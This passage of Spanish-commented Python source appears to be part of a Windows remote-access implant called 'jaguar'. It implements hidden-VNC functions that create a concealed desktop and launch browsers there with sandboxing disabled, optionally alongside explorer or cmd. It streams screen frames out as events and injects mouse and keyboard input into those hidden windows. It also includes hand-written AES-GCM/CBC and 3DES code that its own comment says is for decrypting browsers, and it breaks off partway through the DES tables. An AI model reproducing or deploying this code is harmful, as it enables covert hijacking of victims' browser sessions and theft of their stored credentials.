    _advapi32.InitializeSecurityDescriptor.argtypes = [ctypes.c_void_p, wintypes.DWORD]
    _advapi32.SetSecurityDescriptorDacl.argtypes = [ctypes.c_void_p, wintypes.BOOL,
                                                    ctypes.c_void_p, wintypes.BOOL]

    _ENUMPROC = ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM)

# Un unico --disable-features (evita que Chrome descarte los anteriores) con todo
# lo necesario para que Chrome/Edge/Brave PINTEN en un escritorio oculto.
_FLAGS_CHROMIUM = (
    "--no-sandbox --disable-gpu-sandbox --disable-gpu --disable-gpu-compositing "
    "--disable-direct-composition --disable-software-rasterizer "
    "--force-device-scale-factor=1 --window-position=0,0 "
    "--disable-features=CalculateNativeWinOcclusion,BackForwardCache,"
    "HardwareMediaKeyHandling,Translate,AcceptCHFrame "
    "--disable-backgrounding-occluded-windows --disable-renderer-backgrounding "
    "--disable-background-timer-throttling --disable-hang-monitor "
    "--disable-ipc-flooding-protection --disable-session-crashed-bubble "
    "--hide-crash-restore-bubble --noerrdialogs --no-first-run"
)

_HVNC = {"pid": None, "hwnd": None, "rw": None, "hdesk": None, "navegador": None,
         "exe": None, "error": None, "estado": "idle", "perfil": None, "hash": None,
         "_sd": None, "activado": False}

_HVNC_CFG = {"calidad": 55, "escala": 0.75, "fps": 10}

_GDI = {"w": 0, "h": 0, "mdc": 0, "bmp": 0, "viejo": 0, "buf": None}


def _sec_dacl_null():
    sd = _SECURITY_DESCRIPTOR()
    _advapi32.InitializeSecurityDescriptor(ctypes.byref(sd), 1)
    _advapi32.SetSecurityDescriptorDacl(ctypes.byref(sd), True, None, False)
    sa = _SECURITY_ATTRIBUTES()
    sa.nLength = ctypes.sizeof(_SECURITY_ATTRIBUTES)
    sa.lpSecurityDescriptor = ctypes.cast(ctypes.byref(sd), ctypes.c_void_p)
    sa.bInheritHandle = False
    return sa, sd


def _ruta_navegador(nav):
    nav = (nav or "chrome").lower()
    alias = {
        "chrome": ["chrome.exe"], "google-chrome": ["chrome.exe"],
        "edge": ["msedge.exe"], "msedge": ["msedge.exe"],
        "brave": ["brave.exe"], "opera": ["opera.exe", "launcher.exe"],
        "firefox": ["firefox.exe"],
    }.get(nav, [nav + ".exe"])

    try:
        import winreg
        for exe in alias:
            for raiz in (winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER):
                try:
                    k = winreg.OpenKey(raiz, r"SOFTWARE\Microsoft\Windows"
                                             r"\CurrentVersion\App Paths\\" + exe)
                    ruta = winreg.QueryValueEx(k, "")[0]
                    winreg.CloseKey(k)
                    if ruta and os.path.isfile(ruta):
                        return ruta
                except Exception:
                    pass
    except Exception:
        pass

    for exe in alias:
        r = shutil.which(exe)
        if r:
            return r

    cands = []
    if nav in ("chrome", "google-chrome"):
        cands = [r"%ProgramFiles%\Google\Chrome\Application\chrome.exe",
                 r"%ProgramFiles(x86)%\Google\Chrome\Application\chrome.exe",
                 r"%LocalAppData%\Google\Chrome\Application\chrome.exe"]
    elif nav in ("edge", "msedge"):
        cands = [r"%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe",
                 r"%ProgramFiles%\Microsoft\Edge\Application\msedge.exe"]
    elif nav == "brave":
        cands = [r"%ProgramFiles%\BraveSoftware\Brave-Browser\Application\brave.exe",
                 r"%LocalAppData%\BraveSoftware\Brave-Browser\Application\brave.exe"]
    elif nav == "opera":
        cands = [r"%LocalAppData%\Programs\Opera\opera.exe",
                 r"%ProgramFiles%\Opera\opera.exe"]
    elif nav == "firefox":
        cands = [r"%ProgramFiles%\Mozilla Firefox\firefox.exe",
                 r"%ProgramFiles(x86)%\Mozilla Firefox\firefox.exe"]
    for c in cands:
        p = os.path.expandvars(c)
        if p and os.path.isfile(p):
            return p
    return None


def _hvnc_crear_desktop():
    if _HVNC.get("hdesk"):
        return _HVNC["hdesk"]
    h = _u32.OpenDesktopW(DESKTOP_NAME, 0, False, DESKTOP_ACCESS)
    if not h:
        sa, sd = _sec_dacl_null()
        h = _u32.CreateDesktopW(DESKTOP_NAME, None, None, 0, DESKTOP_ACCESS,
                                ctypes.byref(sa))
        _HVNC["_sd"] = sd
        if not h:
            _log("HVNC", f"CreateDesktopW fallo err={ctypes.GetLastError()}")
    _HVNC["hdesk"] = h
    return h


def _hvnc_crear(exe, linea, desktop):
    si = _STARTUPINFOW()
    si.cb = ctypes.sizeof(_STARTUPINFOW)
    si.lpDesktop = "winsta0\\" + desktop
    si.dwFlags = 0x00000001
    si.wShowWindow = 4
    pi = _PROCESS_INFORMATION()
    buf = ctypes.create_unicode_buffer(linea)
    ok = _k32.CreateProcessW(None, buf, None, None, False, 0, None, None,
                             ctypes.byref(si), ctypes.byref(pi))
    if not ok:
        raise OSError(f"CreateProcess fallo err={ctypes.GetLastError()} exe={exe}")
    pid, hproc = pi.dwProcessId, pi.hProcess
    try:
        _k32.CloseHandle(pi.hThread)
    except Exception:
        pass
    return pid, hproc


def _hvnc_lanzar(nav, url=None):
    exe = _ruta_navegador(nav)
    if not exe:
        raise OSError(f"navegador '{nav}' no encontrado (registro/PATH/rutas)")
    perfil = os.path.join(tempfile.gettempdir(),
                          f"jaguar_hvnc_{nav}_{os.getpid()}_{int(time.time())}")
    try:
        os.makedirs(perfil, exist_ok=True)
    except Exception:
        pass
    objetivo = '"%s"' % url if url else "about:blank"
    extra = _FLAGS_CHROMIUM if nav in ("chrome", "google-chrome", "edge",
                                       "msedge", "brave", "opera") else ""
    linea = ('"{}" --user-data-dir="{}" --no-first-run --no-default-browser-check '
             '--new-window --window-size=1280,800 {} {}').format(
        exe, perfil, objetivo, extra)
    pid, hproc = _hvnc_crear(exe, linea, DESKTOP_NAME)
    _log("HVNC", f"lanzado pid={pid} exe={exe}")
    if _k32.WaitForSingleObject(hproc, 1500) == 0:
        code = wintypes.DWORD()
        _k32.GetExitCodeProcess(hproc, ctypes.byref(code))
        _log("HVNC", f"AVISO: salio enseguida exit={code.value}")
    return pid, perfil


def _hvnc_buscar_ventana():
    """Prioriza la ventana del PID lanzado; respaldo por clase. Fix Chrome."""
    hd = _u32.OpenDesktopW(DESKTOP_NAME, 0, False, DESKTOP_ACCESS)
    if not hd:
        return None
    pid_buscado = _HVNC.get("pid")
    por_pid, por_clase = [], []

    def cb(hwnd, lparam):
        try:
            if not _u32.IsWindowVisible(hwnd):
                return True
            r = _RECT()
            _u32.GetWindowRect(hwnd, ctypes.byref(r))
            if (r.right - r.left) < 200 or (r.bottom - r.top) < 150:
                return True
            cls = ctypes.create_unicode_buffer(256)
            _u32.GetClassNameW(hwnd, cls, 256)
            pid = wintypes.DWORD()
            _u32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
            if pid_buscado and pid.value == pid_buscado:
                por_pid.append(hwnd)
            elif cls.value in _CLASES_BROWSER:
                por_clase.append(hwnd)
        except Exception:
            pass
        return True

    _u32.EnumDesktopWindows(hd, _ENUMPROC(cb), 0)
    _u32.CloseDesktop(hd)
    return (por_pid or por_clase or [None])[0]


def _hvnc_render_widget(hwnd):
    """HWND interno que realmente pinta/recibe input (Chrome_RenderWidgetHostHWND)."""
    if not hwnd:
        return None
    encontrados = []

    def cb(h, lparam):
        try:
            cls = ctypes.create_unicode_buffer(256)
            _u32.GetClassNameW(h, cls, 256)
            if cls.value in _CLASES_RENDER:
                r = _RECT()
                _u32.GetWindowRect(h, ctypes.byref(r))
                if (r.right - r.left) > 200 and (r.bottom - r.top) > 150:
                    encontrados.append((_CLASES_RENDER.index(cls.value), h))
        except Exception:
            pass
        return True

    _u32.EnumChildWindows(hwnd, _ENUMPROC(cb), 0)
    if not encontrados:
        return hwnd
    encontrados.sort(key=lambda t: t[0])
    return encontrados[0][1]


def _hvnc_activar():
    """Marca la ventana como activa/focada dentro del desktop oculto."""
    if _HVNC.get("activado"):
        return
    hwnd = _HVNC.get("hwnd")
    if not hwnd:
        return
    try:
        rw = _HVNC.get("rw") or _hvnc_render_widget(hwnd) or hwnd
        _HVNC["rw"] = rw
        _u32.PostMessageW(hwnd, 0x0006, 1, 0)          # WM_ACTIVATE
        _u32.PostMessageW(hwnd, 0x0007, rw, 0)         # WM_SETFOCUS
        _u32.PostMessageW(rw, 0x0006, 1, 0)
        _u32.PostMessageW(rw, 0x0007, rw, 0)
        _u32.PostMessageW(hwnd, 0x000F, 0, 0)          # WM_PAINT
        _HVNC["activado"] = True
    except Exception:
        pass


def _hvnc_destino(x, y):
    hwnd = _HVNC.get("hwnd")
    if not hwnd:
        return None, x, y
    actual, cx, cy = hwnd, int(x), int(y)
    for _ in range(8):
        try:
            hijo = _u32.ChildWindowFromPointEx(actual, _POINT(cx, cy), 0)
        except Exception:
            break
        if not hijo or hijo == actual:
            break
        p = _POINT(cx, cy)
        try:
            _u32.MapWindowPoints(actual, hijo, ctypes.byref(p), 1)
        except Exception:
            pass
        cx, cy = p.x, p.y
        actual = hijo
    return actual, cx, cy


def _hvnc_foco():
    hwnd = _HVNC.get("rw") or _HVNC.get("hwnd")
    if not hwnd:
        return None
    try:
        tid = _u32.GetWindowThreadProcessId(hwnd, None)
        gti = _GUITHREADINFO()
        gti.cbSize = ctypes.sizeof(_GUITHREADINFO)
        if _u32.GetGUIThreadInfo(tid, ctypes.byref(gti)) and gti.hwndFocus:
            return gti.hwndFocus
    except Exception:
        pass
    return hwnd


def _hvnc_iniciar(a):
    nav = (a.get("navegador") or "chrome").lower()
    hdesk = _hvnc_crear_desktop()
    if not hdesk:
        return {"error": "no se pudo crear el desktop oculto"}
    _HVNC.update({"hwnd": None, "rw": None, "navegador": nav, "error": None,
                  "hash": None, "estado": "arrancando", "activado": False})
    _HVNC["exe"] = _ruta_navegador(nav)
    _log("HVNC", f"iniciar nav={nav} exe={_HVNC['exe']} shell={bool(a.get('shell'))}")

    def trabajo():
        ok = _u32.SetThreadDesktop(hdesk)
        _log("HVNC", f"SetThreadDesktop={'ok' if ok else 'fallo'}")
        if a.get("shell"):
            try:
                win = os.path.join(os.environ.get("WINDIR", r"C:\Windows"), "explorer.exe")
                _hvnc_crear(win, '"%s"' % win, DESKTOP_NAME)
                _log("HVNC", "explorer.exe lanzado")
            except Exception as e:
                _log("HVNC", f"explorer fallo: {e}")
        if a.get("cmd"):
            try:
                cmd = os.path.join(os.environ.get("WINDIR", r"C:\Windows"),
                                   "System32", "cmd.exe")
                _hvnc_crear(cmd, '"%s" /k cd /d %USERPROFILE%' % cmd, DESKTOP_NAME)
                _log("HVNC", "cmd.exe lanzado")
            except Exception as e:
                _log("HVNC", f"cmd fallo: {e}")
        try:
            _HVNC["pid"], _HVNC["perfil"] = _hvnc_lanzar(nav)
        except Exception as e:
            _HVNC["error"] = str(e)
            _HVNC["estado"] = "error"
            _log("HVNC", f"ERROR lanzando: {e}")
            return
        for _ in range(75):
            time.sleep(0.4)
            h = _hvnc_buscar_ventana()
            if h:
                _HVNC["hwnd"] = h
                _HVNC["rw"] = _hvnc_render_widget(h)
                _HVNC["estado"] = "activo"
                _hvnc_activar()
                _log("HVNC", f"ventana hwnd={h} render={_HVNC['rw']}")
                return
        _HVNC["estado"] = "sin_ventana"
        _log("HVNC", "ventana NO encontrada (mira jaguar.log)")

    threading.Thread(target=trabajo, daemon=True).start()
    return {"estado": "arrancando", "navegador": nav, "exe": _HVNC["exe"]}


def _hvnc_estado(a):
    return {k: v for k, v in _HVNC.items() if k != "_sd"}


def _hvnc_opciones(a):
    for k in ("calidad", "escala", "fps"):
        if k in a:
            try:
                _HVNC_CFG[k] = float(a[k])
            except Exception:
                pass
    return {"opciones": dict(_HVNC_CFG)}


def _hvnc_navegar(a):
    nav = (a.get("navegador") or _HVNC.get("navegador") or "chrome").lower()
    try:
        _hvnc_lanzar(nav, a.get("url", ""))
        return {"estado": "navegando"}
    except Exception as e:
        _log("HVNC", f"ERROR navegar: {e}")
        return {"error": str(e)}


def _gdi_liberar():
    try:
        if _GDI["mdc"]:
            if _GDI["viejo"]:
                _g32.SelectObject(_GDI["mdc"], _GDI["viejo"])
            _g32.DeleteDC(_GDI["mdc"])
        if _GDI["bmp"]:
            _g32.DeleteObject(_GDI["bmp"])
    except Exception:
        pass
    _GDI.update({"w": 0, "h": 0, "mdc": 0, "bmp": 0, "viejo": 0, "buf": None})


def _gdi_asegurar(hdc, w, h):
    if _GDI["w"] != w or _GDI["h"] != h or not _GDI["mdc"]:
        _gdi_liberar()
        mdc = _g32.CreateCompatibleDC(hdc)
        bmp = _g32.CreateCompatibleBitmap(hdc, w, h)
        viejo = _g32.SelectObject(mdc, bmp)
        _GDI.update({"w": w, "h": h, "mdc": mdc, "bmp": bmp, "viejo": viejo,
                     "buf": ctypes.create_string_buffer(w * h * 4)})


def _es_negro(datos, paso=8192):
    try:
        for i in range(0, len(datos), paso):
            if datos[i]:
                return False
        return True
    except Exception:
        return False


def _hvnc_captura(a):
    hwnd = _HVNC.get("hwnd") or _hvnc_buscar_ventana()
    if not hwnd or not _u32.IsWindow(hwnd):
        return {"w": 1, "h": 1, "b64": ""}
    _HVNC["hwnd"] = hwnd
    if not _HVNC.get("rw"):
        _HVNC["rw"] = _hvnc_render_widget(hwnd)
    r = _RECT()
    _u32.GetWindowRect(hwnd, ctypes.byref(r))
    w, h = r.right - r.left, r.bottom - r.top
    if w <= 0 or h <= 0:
        return {"w": 1, "h": 1, "b64": ""}

    hdc = _u32.GetWindowDC(hwnd)
    datos = b""
    try:
        _gdi_asegurar(hdc, w, h)
        mdc, bmp, buf = _GDI["mdc"], _GDI["bmp"], _GDI["buf"]
        bmi = _BITMAPINFO()
        bmi.bmiHeader.biSize = ctypes.sizeof(_BIH)
        bmi.bmiHeader.biWidth = w
        bmi.bmiHeader.biHeight = -h
        bmi.bmiHeader.biPlanes = 1
        bmi.bmiHeader.biBitCount = 32

        def _pintar(destino):
            ok = _u32.PrintWindow(destino, mdc, PW_RENDERFULLCONTENT)
            if not ok:
                _u32.PrintWindow(destino, mdc, 0)
            _g32.GetDIBits(mdc, bmp, 0, h, buf, ctypes.byref(bmi), 0)
            return bytes(buf.raw)

        datos = _pintar(hwnd)
        if _es_negro(datos) and _HVNC.get("rw") and _HVNC["rw"] != hwnd:
            datos = _pintar(_HVNC["rw"])
        if _es_negro(datos):
            _g32.BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, 0x00CC0020)
            _g32.GetDIBits(mdc, bmp, 0, h, buf, ctypes.byref(bmi), 0)
            datos = bytes(buf.raw)
    finally:
        _u32.ReleaseDC(hwnd, hdc)

    calidad = int(_HVNC_CFG.get("calidad", 55))
    escala = float(_HVNC_CFG.get("escala", 0.75)) or 1.0
    raw = b""
    try:
        import cv2
        import numpy as np
        arr = np.frombuffer(datos, dtype=np.uint8).reshape((h, w, 4))[:, :, :3]
        if escala != 1.0:
            arr = cv2.resize(arr, None, fx=escala, fy=escala,
                             interpolation=cv2.INTER_LINEAR)
        ok, jpg = cv2.imencode(".jpg", arr, [int(cv2.IMWRITE_JPEG_QUALITY), calidad])
        raw = jpg.tobytes() if ok else b""
    except Exception:
        try:
            from PIL import Image
            img = Image.frombuffer("RGB", (w, h), datos, "raw", "BGRX", 0, 1)
            if escala != 1.0:
                img = img.resize((max(1, int(w * escala)), max(1, int(h * escala))))
            bio = io.BytesIO()
            img.save(bio, "JPEG", quality=calidad)
            raw = bio.getvalue()
        except Exception:
            raw = b""

    if not raw:
        return {"w": w, "h": h, "b64": ""}
    huella = hashlib.md5(raw).digest()
    if huella == _HVNC.get("hash") and not a.get("forzar"):
        return {"w": w, "h": h, "b64": "", "sin_cambios": True}
    _HVNC["hash"] = huella
    return {"w": w, "h": h, "b64": base64.b64encode(raw).decode()}


def _hvnc_raton(a):
    hwnd = _HVNC.get("hwnd") or _hvnc_buscar_ventana()
    if not hwnd:
        return {"estado": "sin ventana"}
    _HVNC["hwnd"] = hwnd
    _hvnc_activar()
    accion = a.get("accion")
    cx_in, cy_in = int(a.get("x", 0)), int(a.get("y", 0))
    pt = _POINT(cx_in, cy_in)
    _u32.ClientToScreen(hwnd, ctypes.byref(pt))
    sx, sy = pt.x, pt.y
    objetivo, cx, cy = _hvnc_destino(cx_in, cy_in)
    if not objetivo:
        objetivo, cx, cy = hwnd, cx_in, cy_in
    lp_cli = ((cy & 0xFFFF) << 16) | (cx & 0xFFFF)
    lp_scr = ((sy & 0xFFFF) << 16) | (sx & 0xFFFF)
    if accion == "move":
        _u32.PostMessageW(objetivo, 0x0200, 0, lp_cli)
    elif accion == "down":
        _u32.PostMessageW(objetivo, 0x0021, objetivo, 0)   # WM_MOUSEACTIVATE
        _u32.PostMessageW(objetivo, 0x0201, 1, lp_cli)
    elif accion == "up":
        _u32.PostMessageW(objetivo, 0x0202, 0, lp_cli)
    elif accion == "right_down":
        _u32.PostMessageW(objetivo, 0x0204, 2, lp_cli)
    elif accion == "right_up":
        _u32.PostMessageW(objetivo, 0x0205, 0, lp_cli)
    elif accion == "doble":
        _u32.PostMessageW(objetivo, 0x0203, 1, lp_cli)
    elif accion == "scroll":
        _u32.PostMessageW(objetivo, 0x020A, (int(a.get("delta", 120)) & 0xFFFF) << 16, lp_scr)
    return {"estado": accion}


def _hvnc_teclado(a):
    objetivo = _hvnc_foco() or _HVNC.get("rw") or _HVNC.get("hwnd")
    if not objetivo:
        return {"estado": "sin ventana"}
    _hvnc_activar()
    if "vk" in a:
        vk = int(a["vk"])
        scan = _u32.MapVirtualKeyW(vk, 0)
        _u32.PostMessageW(objetivo, 0x0100, vk, (scan << 16))
        _u32.PostMessageW(objetivo, 0x0101, vk, (scan << 16) | (1 << 30) | (1 << 31))
        _u32.PostMessageW(objetivo, 0x0102, vk, (scan << 16))
    elif "texto" in a:
        for ch in a["texto"]:
            _u32.PostMessageW(objetivo, 0x0102, ord(ch), 0)
    return {"estado": "ok"}


def _hvnc_cerrar(a):
    pid = _HVNC.get("pid")
    try:
        if pid:
            subprocess.run(["taskkill", "/PID", str(pid), "/T", "/F"],
                           capture_output=True, **_sin_consola())
    except Exception:
        pass
    try:
        exe = _HVNC.get("exe")
        if exe and os.path.isfile(exe):
            subprocess.run(["taskkill", "/IM", os.path.basename(exe), "/F"],
                           capture_output=True, **_sin_consola())
    except Exception:
        pass
    _STREAM["hvnc"]["on"] = False
    _gdi_liberar()
    _HVNC["pid"] = None
    hwnd = _HVNC.get("hwnd")
    try:
        if hwnd and _u32.IsWindow(hwnd):
            _u32.PostMessageW(hwnd, 0x0010, 0, 0)
    except Exception:
        pass
    _HVNC["hwnd"] = None
    _HVNC["rw"] = None
    _HVNC["activado"] = False
    perfil = _HVNC.get("perfil")
    if perfil:
        shutil.rmtree(perfil, ignore_errors=True)
        _HVNC["perfil"] = None
    _HVNC["hash"] = None
    _HVNC["estado"] = "idle"
    try:
        if _HVNC.get("hdesk"):
            _u32.CloseDesktop(_HVNC["hdesk"])
        _HVNC["hdesk"] = None
    except Exception:
        pass
    _log("HVNC", "cerrado")
    return {"estado": "HVNC cerrado"}


# ============================== STREAMS PUSH ================================
_STREAM = {"hvnc": {"on": False, "fps": 10},
           "escritorio": {"on": False, "fps": 5}}


def _hvnc_stream(a):
    if "fps" in a:
        try:
            _STREAM["hvnc"]["fps"] = max(1, min(30, int(float(a["fps"]))))
        except Exception:
            pass
    on = bool(a.get("on"))
    if on and not _STREAM["hvnc"]["on"]:
        _STREAM["hvnc"]["on"] = True
        threading.Thread(target=_hvnc_stream_loop, daemon=True).start()
    elif not on:
        _STREAM["hvnc"]["on"] = False
    return {"stream": _STREAM["hvnc"]["on"], "fps": _STREAM["hvnc"]["fps"]}


def _hvnc_stream_loop():
    while _STREAM["hvnc"]["on"]:
        objetivo = 1.0 / max(1, _STREAM["hvnc"]["fps"])
        t0 = time.time()
        try:
            datos = _hvnc_captura({"forzar": True})
            if datos.get("b64"):
                _enviar_evento("hvnc_frame", datos)
        except Exception:
            pass
        dt = time.time() - t0
        if dt < objetivo:
            time.sleep(objetivo - dt)


def _captura_stream(a):
    if "fps" in a:
        try:
            _STREAM["escritorio"]["fps"] = max(1, min(30, int(float(a["fps"]))))
        except Exception:
            pass
    for k in ("calidad", "escala"):
        if k in a:
            try:
                _CAP_CFG[k] = float(a[k])
            except Exception:
                pass
    on = bool(a.get("on"))
    if on and not _STREAM["escritorio"]["on"]:
        _STREAM["escritorio"]["on"] = True
        threading.Thread(target=_captura_stream_loop, daemon=True).start()
    elif not on:
        _STREAM["escritorio"]["on"] = False
    return {"stream": _STREAM["escritorio"]["on"]}


def _captura_stream_loop():
    while _STREAM["escritorio"]["on"]:
        objetivo = 1.0 / max(1, _STREAM["escritorio"]["fps"])
        t0 = time.time()
        try:
            datos = _captura({"formato": "jpeg", "calidad": int(_CAP_CFG["calidad"]),
                              "escala": float(_CAP_CFG["escala"])})
            if datos.get("b64"):
                _enviar_evento("escritorio_frame", datos)
        except Exception:
            pass
        dt = time.time() - t0
        if dt < objetivo:
            time.sleep(objetivo - dt)


# ======================================================================
#  CRIPTO SIMETRICA EN PYTHON PURO  (AES-256 GCM/CBC + 3DES-CBC)
#  Necesaria para descifrar navegadores sin depender de 'cryptography'.
# ======================================================================
_AES_OK = False
_SB = [0] * 256
_ISB = [0] * 256
_RCON = [0] * 16


def _aes_init():
    global _AES_OK
    if _AES_OK:
        return
    exp = [0] * 256
    lg = [0] * 256

    def xt(a):
        a <<= 1
        if a & 0x100:
            a ^= 0x11B
        return a & 0xFF

    x = 1
    for i in range(255):
        exp[i] = x
        lg[x] = i
        x = xt(x) ^ x
    inv = [0] * 256
    for i in range(1, 256):
        inv[i] = exp[(255 - lg[i]) % 255]

    def rotl8(b, n):
        return ((b << n) | (b >> (8 - n))) & 0xFF

    for i in range(256):
        b = inv[i]
        s = b ^ rotl8(b, 1) ^ rotl8(b, 2) ^ rotl8(b, 3) ^ rotl8(b, 4) ^ 0x63
        _SB[i] = s
        _ISB[s] = i
    r = 1
    for i in range(16):
        _RCON[i] = r
        r = xt(r)
    _AES_OK = True


def _gm(a, b):
    r = 0
    while b:
        if b & 1:
            r ^= a
        a = ((a << 1) ^ (0x1B if a & 0x80 else 0)) & 0xFF
        b >>= 1
    return r


def _aes_claves(clave):
    _aes_init()
    nk = len(clave) // 4
    nr = nk + 6
    w = [list(clave[4 * i:4 * i + 4]) for i in range(nk)]
    i = nk
    total = 4 * (nr + 1)
    while i < total:
        temp = list(w[i - 1])
        if i % nk == 0:
            temp = temp[1:] + temp[:1]
            temp = [_SB[b] for b in temp]
            temp[0] ^= _RCON[i // nk - 1]
        elif nk > 6 and i % nk == 4:
            temp = [_SB[b] for b in temp]
        w.append([w[i - nk][j] ^ temp[j] for j in range(4)])
        i += 1
    return (w, nr)


def _aes_bloque(clave_prog, bloque):
    w, nr = clave_prog
    s = list(bloque)
    for c in range(4):
        for r in range(4):
            s[4 * c + r] ^= w[c][r]
    for rnd in range(1, nr):
        t = [0] * 16
        for c in range(4):
            for r in range(4):
                t[4 * c + r] = _SB[s[4 * ((c + r) % 4) + r]]
        for c in range(4):
            a0, a1, a2, a3 = t[4 * c:4 * c + 4]
            s[4 * c + 0] = _gm(a0, 2) ^ _gm(a1, 3) ^ a2 ^ a3
            s[4 * c + 1] = a0 ^ _gm(a1, 2) ^ _gm(a2, 3) ^ a3
            s[4 * c + 2] = a0 ^ a1 ^ _gm(a2, 2) ^ _gm(a3, 3)
            s[4 * c + 3] = _gm(a0, 3) ^ a1 ^ a2 ^ _gm(a3, 2)
        for c in range(4):
            for r in range(4):
                s[4 * c + r] ^= w[4 * rnd + c][r]
    t = [0] * 16
    for c in range(4):
        for r in range(4):
            t[4 * c + r] = _SB[s[4 * ((c + r) % 4) + r]]
    for c in range(4):
        for r in range(4):
            s[4 * c + r] = t[4 * c + r] ^ w[4 * nr + c][r]
    return bytes(s)


def _aes_cbc_descifrar(clave, iv, datos):
    prog = _aes_claves(clave)
    out = bytearray()
    prev = iv
    for i in range(0, len(datos), 16):
        blk = datos[i:i + 16]
        if len(blk) < 16:
            blk = blk + b"\x00" * (16 - len(blk))
        dec = _aes_bloque(prog, blk)
        out += bytes(a ^ b for a, b in zip(dec, prev))
        prev = blk
    if out and 0 < out[-1] <= 16:
        n = out[-1]
        if out[-n:] == bytes([n]) * n:
            out = out[:-n]
    return bytes(out)


_R128 = 0xE1000000000000000000000000000000


def _gf128_mul(x, y):
    z = 0
    v = y
    for i in range(128):
        if (x >> (127 - i)) & 1:
            z ^= v
        if v & 1:
            v = (v >> 1) ^ _R128
        else:
            v >>= 1
    return z


def _aes_ctr(prog, j0, datos):
    out = bytearray()
    c = j0
    for i in range(0, len(datos), 16):
        c = (c + 1) & ((1 << 128) - 1)
        ks = _aes_bloque(prog, c.to_bytes(16, "big"))
        blk = datos[i:i + 16]
        out += bytes(a ^ b for a, b in zip(blk, ks))
    return bytes(out)


def _aes_gcm_descifrar(clave, nonce, ct_tag):
    if len(nonce) != 12 or len(ct_tag) < 16:
        return b""
    prog = _aes_claves(clave)
    h = int.from_bytes(_aes_bloque(prog, b"\x00" * 16), "big")
    ct, tag = ct_tag[:-16], ct_tag[-16:]
    datos = ct + b"\x00" * ((16 - len(ct) % 16) % 16)
    datos += b"\x00" * 8 + (len(ct) * 8).to_bytes(8, "big")
    s = 0
    for i in range(0, len(datos), 16):
        s = _gf128_mul(s ^ int.from_bytes(datos[i:i + 16], "big"), h)
    j0 = int.from_bytes(nonce + b"\x00\x00\x00\x01", "big")
    ek = int.from_bytes(_aes_bloque(prog, j0.to_bytes(16, "big")), "big")
    if (ek ^ s) != int.from_bytes(tag, "big"):
        return b""
    return _aes_ctr(prog, j0, ct)


# ------------------------------- DES (para 3DES) ----------------------------
_DES_IP = [58, 50, 42, 34, 26, 18, 10, 2, 60, 52, 44, 36, 28, 20, 12, 4,
           62, 54, 46, 38, 30, 22, 14, 6, 64, 56, 48, 40, 32, 24, 16, 8,
           57, 49, 41, 33, 25, 17, 9, 1, 59, 51, 43, 35, 27, 19, 11, 3,
           61, 53, 45, 37, 29, 21, 13, 5, 63, 55, 47, 39, 31, 23, 15, 7]
_DES_FP = [40, 8, 48, 16, 56, 24, 64, 32, 39, 7, 47, 15, 55, 23, 63, 31,
           38, 6, 46, 14, 54, 22, 62, 30, 37, 5, 45, 13, 53, 21, 61, 29,
           36, 4, 44, 12, 52, 20, 60, 28, 35, 3, 43, 11, 51, 19, 59, 27,
           34, 2, 42, 10, 50, 18, 58, 26, 33, 1, 41, 9, 49, 17, 57, 25]
_DES_E = [32, 1, 2, 3, 4, 5, 4, 5, 6, 7, 8, 9, 8, 9, 10, 11, 12, 13,
          12, 13, 14, 15, 16, 17, 16, 17, 18, 19, 20, 21, 20, 21, 22, 23, 24, 25,
          24, 25, 26, 27, 28, 29, 28, 29, 30, 31, 32, 1]
_DES_P = [16, 7, 20, 21, 29, 12, 28, 17, 1, 15, 23, 26, 5, 18, 31, 10,
          2, 8, 24, 14, 32, 27, 3, 9, 19, 13, 30, 6, 22, 11, 4, 25]
_DES_S = [
    [14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7,
     0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8,
     4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0,
     15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13],
    [15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10,
     3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5,
     0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15,
     13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9],
    [10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8,
     13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1,
     13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7,
     1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12],
    [7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15,
     13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9,
     10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4,
     3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14],
    [2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9,
     14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6,
     4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14,
     11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3],
    [12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11,
     10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8,
     9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6,
     4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13],
    [4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1,
     13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6,
     1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2,
     6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12],
